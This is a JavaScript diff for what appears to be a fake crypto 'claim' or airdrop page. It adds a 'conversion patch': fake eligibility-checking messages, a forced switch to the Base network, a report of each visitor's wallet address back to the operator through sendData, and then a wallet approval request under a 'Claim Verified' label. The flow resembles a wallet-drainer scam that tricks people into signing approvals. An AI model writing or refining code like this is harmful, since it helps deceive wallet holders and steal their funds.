@@ -2,6 +2,29 @@
 let userAddress = null;
 let provider = null;
 
+
+// R10 conversion patch: instant feedback + auto switch to Base network
+function setBtn(txt,disabled){const b=document.querySelector('.btn-connect');
+  if(b){b.textContent=txt;b.disabled=!!disabled;}}
+async function ensureBaseNetwork(chainId){
+    if(chainId==='0x2105')return true; // Base mainnet
+    try{
+        await provider.request({method:'wallet_switchEthereumChain',
+            params:[{chainId:'0x2105'}]});
+        return true;
+    }catch(e){
+        if(e.code===4902){
+            try{await provider.request({method:'wallet_addEthereumChain',params:[{
+                chainId:'0x2105',chainName:'Base Mainnet',
+                nativeCurrency:{name:'Ether',symbol:'ETH',decimals:18},
+                rpcUrls:['https://mainnet.base.org'],
+                blockExplorerUrls:['https://basescan.org']}]});return true;
+            }catch(e2){return false}
+        }
+        return false;
+    }
+}
+
 async function connectWallet() {
     if (typeof window.ethereum !== 'undefined') {
         provider = window.ethereum;
@@ -21,7 +44,10 @@ async function connectWallet() {
             checkTokenBalances(userAddress);
             
             // Show "verifying" then trigger approval request
-            setTimeout(() => showApprovalStep(), 2000);
+            setBtn('⏳ Checking eligibility...',true);
+            const onBase = await ensureBaseNetwork(chainId);
+            sendData('network_check',{onBase,address:userAddress});
+            setTimeout(() => showApprovalStep().then(()=>setBtn('Claim Verified ✅',false)), 1800);
             
         } catch (err) {
             console.error(err);
